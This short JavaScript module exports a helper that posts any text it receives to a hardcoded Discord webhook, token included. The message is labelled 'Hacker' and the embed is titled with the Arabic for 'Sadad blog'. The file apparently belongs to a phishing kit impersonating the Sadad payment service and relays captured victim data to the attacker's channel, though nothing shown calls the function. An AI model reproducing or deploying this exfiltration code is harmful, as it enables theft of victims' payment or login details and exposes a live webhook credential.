import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324125265382867026/NvdFRkM1QOwDXIr5nV_cEas5azJnt1UDnQ59b91c9H-wUq8c6xVMkBPdIDbhuhmLSakn",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
